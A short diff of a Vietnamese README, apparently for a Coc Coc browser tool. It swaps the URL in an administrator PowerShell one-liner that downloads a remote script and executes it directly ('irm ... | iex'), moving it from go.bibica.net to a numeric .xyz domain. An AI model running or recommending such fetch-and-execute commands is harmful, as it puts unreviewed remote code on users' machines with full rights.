@@ -31,7 +31,7 @@
 > ⚠️ Yêu cầu chạy PowerShell với quyền **Administrator**
 
 ```powershell
-irm https://go.bibica.net/coccoc | iex
+irm https://coccoc.33166099.xyz | iex
 ```
 
 ### Phương pháp 2: Chạy thủ công trên Windows
